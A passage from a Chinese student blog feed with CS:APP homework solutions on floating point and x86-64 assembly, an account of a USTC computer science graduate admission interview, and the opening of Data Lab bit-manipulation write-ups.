class="comment">// 1. +0或者-0都为0(左移一位去除符号位对0影响)</span></span><br><span class="line">           (sx &amp;&amp; !sy) ||                    <span class="comment">// 2. x为负（符号位sx为1），y为正（符号位sy为0）</span></span><br><span class="line">           (!sx &amp;&amp; !sy &amp;&amp; ux &lt;= uy) ||       <span class="comment">// 3. x,y都为正时，x&lt;=y等价于ux&lt;=uy</span></span><br><span class="line">           (sx &amp;&amp; sy &amp;&amp; ux &gt;= uy);           <span class="comment">// 4. x,y都为负时，x&lt;=y等价于ux&gt;=uy</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-4">2.89</h2>
<p>我们在一个int 类型为32
位补码表示的机器上运行程序。float类型的值使用32 位IEEE 格式，而double
类型的值使用64 位IEEE 格式。我们产生随机整数x 、y 和z,
并且把它们转换成double 类型的值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Create some arbitrary values*/</span></span><br><span class="line"><span class="type">int</span> x = random();</span><br><span class="line"><span class="type">int</span> y = random();</span><br><span class="line"><span class="type">int</span> z = random();</span><br><span class="line"><span class="comment">/*Convert to double*/</span></span><br><span class="line"><span class="type">double</span> dx = (<span class="type">double</span>)x;</span><br><span class="line"><span class="type">double</span> dy = (<span class="type">double</span>)y;</span><br><span class="line"><span class="type">double</span> dz = (<span class="type">double</span>)z;</span><br></pre></td></tr></table></figure>
<p>对于下列的每个C 表达式，你要指出表达式是否总是为1 。如果它总是为1,
描述其中的数学原理。否则，列举出使它为0的参数的例子。请注意，不能使用IA32
机器运行GCC 来测试你的答案，因为对于float 和double, 它使用的都是80
位的扩展精度表示。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">A. (<span class="type">float</span>)x==(<span class="type">float</span>)dx</span><br><span class="line">B. dx-dy==(<span class="type">double</span>)(x-y)</span><br><span class="line">C. (dx+dy)+dz==dx+(dy+dz)</span><br><span class="line">D. (dx*dy)*dz==dx*(dy*dz)</span><br><span class="line">E. dx/dx==dz/dz</span><br></pre></td></tr></table></figure>
<p><strong>解：</strong></p>
<p>A. 真。int类型转成double类型不会损失精度，此时，x 和 dx
转成float类型虽然可能会损失精度，但是在舍入原则相同的情况下得到的结果相同。</p>
<p>B.
假。当x-y得到的结果溢出时，转成double类型的结果与真实结果不同，如y=INT_MIN时。</p>
<p>C.
真。两个int类型转成double类型后，相加得到的结果仍然在double类型可表示范围内，且不会因为舍入丢失精度，所以是可以结合的。</p>
<p>D.
假。两个int类型转成double类型后，相乘得到的结果不一定在double类型可表示范围内，可能会发生溢出或者由于舍入导致失去精度，所以不具有结合性。</p>
<p>E. 假。当dx != 0 且 dz ==
0时，左边结果为1，右边结果为无穷大，不相等。</p>
<h2 id="section-5">2.91</h2>
<p>大约公元前250 年，希腊数学家阿基米德证明了<span class="math inline">\(\frac{223}{71}&lt;\pi&lt;\frac{22}{7}\)</span>。如果当时有一台计算机和标准库&lt;math.h&gt;,
他就能够确定<span class="math inline">\(\pi\)</span>的单精度浮点近似值的十六进制表示为
0x40490FDB 。当然，所有的这些都只是近似值，因为<span class="math inline">\(\pi\)</span>不是有理数。</p>
<p>A. 这个浮点值表示的二进制小数是多少？</p>
<p>B. <span class="math inline">\(\frac{22}{7}\)</span>的二进制小数表示是什么？提示：参见家庭作业2.
83 。</p>
<p>C. 这两个<span class="math inline">\(\pi\)</span>的近似值从哪一位（相对于二进制小数点）开始不同的？</p>
<p><strong>解：</strong></p>
<ol type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">十六进制：</span><br><span class="line">    <span class="number">0x40490FDB</span></span><br><span class="line">二进制：</span><br><span class="line">    <span class="number">0100</span> <span class="number">0000</span> <span class="number">0100</span> <span class="number">1001</span> <span class="number">0000</span> <span class="number">1111</span> <span class="number">1101</span> <span class="number">1011</span></span><br><span class="line">浮点格式：</span><br><span class="line">    <span class="number">0</span> <span class="number">10000000</span> <span class="number">10010010000111111011011</span>    </span><br><span class="line">    s:<span class="number">0</span> e=<span class="number">2</span>^<span class="number">7</span>=<span class="number">128</span> E=<span class="number">128</span><span class="number">-127</span>=<span class="number">1</span> f=<span class="number">0.10010010000111111011011</span> M=<span class="number">1.10010010000111111011011</span></span><br><span class="line">二进制小数：</span><br><span class="line">    <span class="number">11.0010010000111111011011</span></span><br></pre></td></tr></table></figure>
<p>B. <span class="math inline">\(\frac{22}{7}=3+\frac{1}{7}\)</span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Y=<span class="number">1</span>，<span class="number">2</span>^k<span class="number">-1</span>=<span class="number">7</span>,k=<span class="number">3</span>,y=<span class="number">001</span></span><br><span class="line">二进制小数：<span class="number">11.001001001</span>...(y=<span class="number">001</span>)</span><br></pre></td></tr></table></figure>
<p>C. 从小数点后第9位开始不同。</p>
<h1 id="参考">参考</h1>
<p><a href="https://dreamanddead.github.io/CSAPP-3e-Solutions/">CSAPP-3E-SOLUTIONS</a></p>
]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>2022中科大CS考研面试记录</title>
    <url>/post/7ad1122c.html</url>
    <content><![CDATA[<p>一开始保研失败，被列在候补名单中，只能去专项计划中的北京某高校，反复横跳了好久还是放弃了，然后才从零开始复习，慌得一批，考完觉得应该是陪跑了。寒假都没有复习直接去面试工作，没想到最后居然过了，果然不到最后一刻不能放弃。但是因为初试分比较低，最后踩线录取，感觉用光了半辈子的运气。。。现在记录一下中科大计算机考研复试的面试经历吧，希望对大家能有一点帮助，再给自己攒攒欧气。。。</p>
<span id="more"></span>
<p>因为疫情，今年还是线上面试，不过形式发生了一点点变化，面试前几天突然通知要PPT自我介绍（自我介绍中英文都是可以的，但是实际上面试的时候老师会要求英文的，不然老师怎么打分。。。）。因为原来看经验贴准备了英文自我介绍，所以我用中文做的PPT，然后用英文自我介绍（双保险）。</p>
<h1 id="关于自我介绍ppt">关于自我介绍PPT</h1>
<p>我从四个方面介绍的：学业表现、荣誉与奖项、项目与比赛、研究志向（感兴趣的方向、目标等）。</p>
<h1 id="面试流程">面试流程</h1>
<h2 id="英文提问">英文提问</h2>
<ul>
<li>介绍一下项目</li>
</ul>
<p>看我自我介绍里面提到的项目，就让我用英文介绍一下。这个问题我没怎么准备，就说了数据集，使用的模型等等，实在扯不下去就停了。</p>
<ul>
<li>最喜欢的课程</li>
</ul>
<p>问英文的老师离屏幕很远，没听清问题，就让老师重复了一边，然后终于反应过来是说的是course……那边老师都笑了，哎，尴尬。我终于反应过来以后，说了事先想好的回答：算法设计与分析。然后说了这门课讲了啥，我学到了啥。</p>
<h2 id="专业问题">专业问题</h2>
<p>我说了最喜欢的课是算法设计与分析，然后某个和蔼的老师（可能是面试组的组长）就问我这门课学了什么，我提到了贪心算法，然后继续问我举几个贪心算法的例子，我举了数据结构上最小生成树和哈夫曼编码的例子。继续问最小生成树有哪些算法，我说普利姆算法和克鲁斯卡尔算法，以及具体的原理。他问有向图能否用这个算法，没回答上来……老师语重心长地说要学深入一点，我就嗯嗯，笑笑，说确实。</p>
<p>另一个老师问了项目的细节，比如项目的应用背景，还有数据集来源等等。</p>
<p>最后组长说我回答的不错，还问我成绩这么好为什么没有免试，我就实话实说了，比赛结果出来的比较晚，错过了保研材料提交的时间，最后只在候补名单中，然后下定决定复习考研了。</p>
<h1 id="后记">后记</h1>
<p>祝大家成功上岸！</p>
]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>复试</tag>
      </tags>
  </entry>
  <entry>
    <title>中科大计算机系统作业2</title>
    <url>/post/12d42946.html</url>
    <content><![CDATA[<p>本文为中科大研究生课程——计算机系统作业2的题目解答记录。使用的教材为《深入理解计算机系统》。</p>
<span id="more"></span>
<h1 id="题目与解答">题目与解答</h1>
<h2 id="section">3.58</h2>
<p>一个函数的原型为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode2</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> z)</span>;</span><br></pre></td></tr></table></figure>
<p>GCC 产生如下汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">decode2:</span><br><span class="line">	subq 	%rdx, %rsi</span><br><span class="line">	imulq 	%rsi, %rdi</span><br><span class="line">	movq 	%rsi, %rax</span><br><span class="line">	salq 	$63,%rax</span><br><span class="line">	sarq 	$63, %rax</span><br><span class="line">	xorq 	%rdi, %rax</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>参数x 、y 和z 通过寄存器%rdi、%rsi 和 %rdx
传递。代码将返回值存放在寄存器%rax 中。写出等价于上述汇编代码的decode2
的C代码。</p>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode2</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> tmp = y - z;</span><br><span class="line">  <span class="keyword">return</span> (tmp * x) ^ (tmp &lt;&lt; <span class="number">63</span> &gt;&gt; <span class="number">63</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-1">3.60</h2>
<p>考虑下面的汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">loop</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> n)</span></span><br><span class="line">x in%rdi, n in%esi</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loop :</span><br><span class="line">	movl	%esi, %ecx</span><br><span class="line">	movl	$1, %edx</span><br><span class="line">	movl	$0, %eax</span><br><span class="line">	jmp		.L2</span><br><span class="line">.L3:</span><br><span class="line">	movq	%rdi, %r8</span><br><span class="line">	andq	%rdx, %r8</span><br><span class="line">	orq		%r8, %rax</span><br><span class="line">	salq	%cl, %rdx</span><br><span class="line">.L2:</span><br><span class="line">	testq %rdx, %rdx</span><br><span class="line">	jne .L3</span><br><span class="line">	rep; ret</span><br></pre></td></tr></table></figure>
<p>以上代码是编译以下整体形式的C 代码产生的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">loop2</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = ____________;</span><br><span class="line">    <span class="type">long</span> mask;</span><br><span class="line">    <span class="keyword">for</span> (mask = ____________; mask ____________; mask =____________)&#123;</span><br><span class="line">        result |= ____________;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你的任务是填写这个C
代码中缺失的部分，得到一个程序等价于产生的汇编代码。回想一下，这个函数的结果是在寄存器%rax
中返回的。你会发现以下工作很有帮助：检查循环之前、之中和之后的汇编代码，形成一个寄存器和程序变最之间一致的映射。</p>
<p>A. 哪个寄存器保存着程序值x 、n 、result 和mask?</p>
<p>B. result 和mask 的初始值是什么？</p>
<p>C. mask 的测试条件是什么？</p>
<p>D. mask 是如何被修改的？</p>
<p>E. result 是如何被修改的？</p>
<p>F. 填写这段C 代码中所有缺失的部分。</p>
<p><strong>解：</strong></p>
<ol type="A">
<li></li>
</ol>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">变量</th>
<th style="text-align: left;">寄存器</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">x</td>
<td style="text-align: left;">%rdi</td>
</tr>
<tr class="even">
<td style="text-align: left;">n</td>
<td style="text-align: left;">%esi</td>
</tr>
<tr class="odd">
<td style="text-align: left;">result</td>
<td style="text-align: left;">%rax</td>
</tr>
<tr class="even">
<td style="text-align: left;">mask</td>
<td style="text-align: left;">%rdx</td>
</tr>
</tbody>
</table>
<ol start="2" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = <span class="number">0</span></span><br><span class="line">mask = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ol start="3" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mask != <span class="number">0</span></span><br></pre></td></tr></table></figure>
<ol start="4" type="A">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mask = mask &lt;&lt; n</span><br></pre></td></tr></table></figure>
<ol start="5" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">loop2</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> mask;</span><br><span class="line">  <span class="keyword">for</span> (mask = <span class="number">1</span>; mask != <span class="number">0</span>; mask &lt;&lt;= n) &#123;</span><br><span class="line">    result |= (x &amp; mask);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-2">3.63</h2>
<p>这个程序给你一个机会，从反汇编机器代码逆向工程一个switch
语句。在下面这个过程中，去掉了switch 语句的主体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">switch_prob</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = x;</span><br><span class="line">    <span class="keyword">switch</span> (n)&#123;</span><br><span class="line">    <span class="comment">/* Fill in code here */</span></span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面给出了这个过程的反汇编机器代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">switch_prob</span> <span class="params">(<span class="type">long</span> x,<span class="type">long</span> n)</span></span><br><span class="line">x in%rdi , n in%rsi</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400590 &lt;switch_prob&gt;:</span><br><span class="line">400590: 48 83 ee 3c				sub		$0x3c,%rsi</span><br><span class="line">400594: 48 83 fe 05				cmp		$0x5,%rsi</span><br><span class="line">400598: 77 29					ja		4005c3 &lt;switch_prob+0x33&gt;</span><br><span class="line">40059a: ff 24 f5 f8 06 40 00	jmpq	*0x4006f8(,%rsi,8)</span><br><span class="line">4005a1: 48 8d 04 fd 00 00 00	lea		0x0 (,%rdi,8),%rax</span><br><span class="line">4005a8: 00</span><br><span class="line">4005a9: c3						retq	</span><br><span class="line">4005aa: 48 89 f8				mov		%rdi,%rax</span><br><span class="line">4005ad: 48 c1 f8 03				sar		$0x3,%rax</span><br><span class="line">4005b1: c3						retq	</span><br><span class="line">4005b2: 48 89 f8				mov		%rdi,%rax</span><br><span class="line">4005b5: 48 c1 eO 04				shl		$0x4,%rax</span><br><span class="line">4005b9: 48 29 f8				sub		%rdi,%rax</span><br><span class="line">4005bc: 48 89 c7				mov		%rax,%rdi</span><br><span class="line">4005bf: 48 Of af ff				imul	%rdi,%rdi</span><br><span class="line">4005c3: 48 8d 47 4b				lea		Ox4b(%rdi),%rax</span><br><span class="line">4005c7: c3						retq	</span><br></pre></td></tr></table></figure>
<p>跳转表驻留在内存的不同区域中。可以从第5
行的间接跳转看出来，跳转表的起始地址为0x4006f8 。用调试器GDB,
我们可以用命令x/6gx 0x4006f8 来检查组成跳转表的6个8 字节字的内存。GDB
打印出下面的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/6gx 0x4006f8</span><br><span class="line">0x4006f8: 0x00000000004005a1 	0x00000000004005c3</span><br><span class="line">0x400708: 0x00000000004005a1 	0x00000000004005aa</span><br><span class="line">0x400718: 0x00000000004005b2	0x00000000004005bf</span><br></pre></td></tr></table></figure>
<p>用C 代码填写开关语句的主体，使它的行为与机器代码一致。</p>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">switch_prob</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = x;</span><br><span class="line">    <span class="keyword">switch</span> (n)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">62</span>:</span><br><span class="line">            result = <span class="number">8</span>*x;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">63</span>:</span><br><span class="line">            result = x&gt;&gt;<span class="number">3</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            result= (x&lt;&lt;<span class="number">4</span>)-x;</span><br><span class="line">            x=result;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">65</span>:</span><br><span class="line">            x=x*x;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = <span class="number">0x4B</span>+x;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-3">3.69</h2>
<p>你负责维护一个大型的C 程序，遇到下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> first;</span><br><span class="line">    a_struct a[CNT];</span><br><span class="line">    <span class="type">int</span> last;</span><br><span class="line">&#125; b_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">long</span> i, b_struct *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = bp-&gt;first + bp-&gt;last;</span><br><span class="line">    a_struct *ap = &amp;bp-&gt;a[i];</span><br><span class="line">    ap-&gt;x[ap-&gt;idx] = n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译时常数CNT 和结构a_struct
的声明是在一个你没有访问权限的文件中。幸好，你有代码的'.o'版本，可以用OBJDUMP
程序来反汇编这些文件，得到下面的反汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span> <span class="params">(<span class="type">long</span> i, b_struct *bp)</span></span><br><span class="line">i in %rdi, bp in %rsi</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;test&gt;:</span><br><span class="line">	0: Sb Se 20 01 00 00	mov		0x120(%rsi),%ecx</span><br><span class="line">	6: 03 Oe				add 	(%rsi),%ecx</span><br><span class="line">	S: 4S Sd 04 bf			lea 	(%rdi,%rdi,4),%rax</span><br><span class="line">	c: 4S Sd 04 c6			lea 	(%rsi,%rax,8),%rax</span><br><span class="line">	10: 4S Sb 50 OS			mov 	Ox8(%rax),%rdx</span><br><span class="line">	14: 4S 63 c9			movslq	%ecx,%rcx</span><br><span class="line">	17: 48 89 4c dO 10		mov		%rcx,0x10(%rax,%rdx,8)</span><br><span class="line">	le: c3					retq</span><br></pre></td></tr></table></figure>
<p>运用你的逆向工程技术，推断出下列内容：</p>
<p>A. CNT 的值。</p>
<p>B. 结构a_struct 的完整声明。假设这个结构中只有字段idx 和x ,
并且这两个字段保存的都是有符号值。</p>
<p><strong>解：</strong></p>
<p>A. 7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;test&gt;:</span><br><span class="line">	0: Sb Se 20 01 00 00	mov		0x120(%rsi),%ecx  # Get bp-&gt;last</span><br><span class="line">	6: 03 Oe				add 	(%rsi),%ecx # n = bp-&gt;first</span><br></pre></td></tr></table></figure>
<p>int
类型4字节，还需要进行对齐，所以占8字节，剩下的都是数组<code>a_struct a[CNT];</code>的空间，
<code>CNT*40 + 8 = 288 = 0x120</code>，所以<code>CNT = 7</code>。</p>
<ol start="2" type="A">
<li></li>
</ol>
<p>分析汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;test&gt;:</span><br><span class="line">	0: Sb Se 20 01 00 00	mov		0x120(%rsi),%ecx</span><br><span class="line">	6: 03 Oe				add 	(%rsi),%ecx # get n</span><br><span class="line">	S: 4S Sd 04 bf			lea 	(%rdi,%rdi,4),%rax  # compute 5*i</span><br><span class="line">	c: 4S Sd 04 c6			lea 	(%rsi,%rax,8),%rax  # compute bp+40*i</span><br><span class="line">	10: 4S Sb 50 OS			mov 	Ox8(%rax),%rdx # Get bp-&gt;a[i].idx</span><br><span class="line">	14: 4S 63 c9			movslq	%ecx,%rcx # shift n from 32b to 64b</span><br><span class="line">	17: 48 89 4c dO 10		mov		%rcx,0x10(%rax,%rdx,8) # mov n to ap-&gt;x[ap-&gt;idx] </span><br><span class="line">	le: c3					retq</span><br></pre></td></tr></table></figure>
<p>第6行得到idx的值，这里使用的%rdx寄存器，所以应该是long类型；由第一小问可以知道<code>a_struct</code>的大小为40字节，第7行将n从32字节转为64，所以数组x应该是long类型，并且为4个。所以<code>a_struct</code>的完整声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">long</span> idx;</span><br><span class="line">  <span class="type">long</span> x[<span class="number">4</span>];</span><br><span class="line">&#125; a_struct;</span><br></pre></td></tr></table></figure>
<h2 id="section-4">3.70</h2>
<p>考虑下面的联合声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">ele</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">long</span> *p;</span><br><span class="line">        <span class="type">long</span> y;</span><br><span class="line">    &#125; e1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">long</span> x;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">ele</span> *<span class="title">next</span>;</span></span><br><span class="line">    &#125; e2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个声明说明联合中可以嵌套结构。下面的函数（省略了一些表达式）对一个链表进行操作，链表是以上述联合作为元素的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">proc</span><span class="params">(<span class="keyword">union</span> ele *up)</span>&#123;</span><br><span class="line">    up-&gt;___________= *(___________) - ___________;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>A. 下列字段的偏移址是多少（以字节为单位）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e1.p    _____________</span><br><span class="line">e1.y	_____________</span><br><span class="line">e2.x	_____________</span><br><span class="line">e2.next	_____________</span><br></pre></td></tr></table></figure>
<p>B. 这个结构总共需要多少个字节？</p>
<p>C. 编译器为proc 产生下面的汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">proc</span> <span class="params">(<span class="keyword">union</span> ele *up)</span></span><br><span class="line">up in %rdi</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proc:</span><br><span class="line">	movq	8(%rdi), %rax</span><br><span class="line">	movq	(%rax) , %rdx</span><br><span class="line">	movq	(%rdx), %rdx</span><br><span class="line">	subq	8(%rax), %rdx</span><br><span class="line">	movq	%rdx, (%rd)</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>在这些信息的基础上，填写proc
代码中缺失的表达式。提示：有些联合引用的解释可以有歧义，当你清楚引用指引到哪里的时候，就能够澄清这些歧义。只有一个答案，不需要进行强制类型转换，且不违反任何类型限制。</p>
<p><strong>解：</strong></p>
<ol type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e1.p    <span class="number">0</span></span><br><span class="line">e1.y	<span class="number">8</span></span><br><span class="line">e2.x	<span class="number">0</span></span><br><span class="line">e2.next	<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>B. 共需要8字节。</p>
<ol start="3" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">proc</span><span class="params">(<span class="keyword">union</span> ele *up)</span>&#123;</span><br><span class="line">    up-&gt;e2.x= *((up-&gt;e2.next)-&gt;e1.p) - (up-&gt;e2.next)-&gt;e1.y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考">参考</h1>
<p><a href="https://dreamanddead.github.io/CSAPP-3e-Solutions/">CSAPP-3E-SOLUTIONS</a></p>
]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>中科大计算机系统实验1&amp;2&amp;3</title>
    <url>/post/ba783922.html</url>
    <content><![CDATA[<p>本文记录中科大研究生课程——计算机系统的相关实验，使用的教材为《深入理解计算机系统》第3版。课程给的实验材料貌似用的是第2版的，额外添加了一些实验要求和说明，但是原理和思想基本都是一样的。</p>
<span id="more"></span>
<h1 id="实验1位操作data-lab">实验1：位操作（Data Lab）</h1>
<h2 id="实验介绍">实验介绍</h2>
<p>本实验考察计算机信息的表示，要求实现简单的位操作、逻辑运算、二进制补码和浮点函数，并且限制了可使用的
C 操作符和数量，有助于理解 C
数据类型的位级表示以及数据操作的位级行为。本实验总共包括位操作的15个编程题。</p>
<h2 id="实验环境">实验环境</h2>
<table>
<thead>
<tr class="header">
<th>CPU</th>
<th>Intel(R) Xeon(R) Silver 4110 CPU @ 2.10GHz</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>操作系统</td>
<td>Ubuntu 20.04.3 (64位)</td>
</tr>
<tr class="even">
<td>C/C++编译器</td>
<td>gcc version 9.4.0</td>
</tr>
</tbody>
</table>
<h2 id="实验要求">实验要求</h2>
<p>"bits.c"文件中包含需要实现的15个函数，文件中规定了实现每个函数需要的逻辑和算术操作符（规定数量）。</p>
<ul>
<li>只能使用规定的操作符
<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>不能使用循环或者条件语句</li>
<li>不能使用超过8位的常数 <code>0xff</code></li>
</ul>
<h2 id="实验思路">实验思路</h2>
<h3 id="bitxor">1. bitXor</h3>
<p>本题要求使用按位与<code>&amp;</code>和按位取反<code>~</code>实现按位异或。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp;</span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">return</span> ~(~x &amp; ~y) &amp; ~(x &amp; y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>异或就是当参与运算的两个二进制数不同时结果才为1，其他情况为0。</p>
<p>根据德摩根定律（参考离散数学集合论知识）：</p>
<p><img src="/post/ba783922/c2f4430bd910acad95a9e1ea734ec185.svg"></p>
<p>推导出：</p>
<p><img src="/post/ba783922/image-20221030174706082.png" alt="image-20221030174706082" style="zoom: 50%;"></p>
<p>转换为C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x^y=~(~x&amp;~y)&amp;~(x&amp;y)</span><br></pre></td></tr></table></figure>
<h3 id="tmin">2. tmin</h3>
<p>求int类型的最小值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>C 语言中 <code>int</code> 类型是32位，即4字节数 。<code>int</code>
类型的最小值，即最高位符号位为 1，其他位均为 0，所以只需要将 1 左移 31
位。</p>
<h3 id="istmax">3. isTmax</h3>
<p>判断输入值是否为 int 类型的最大值。</p>
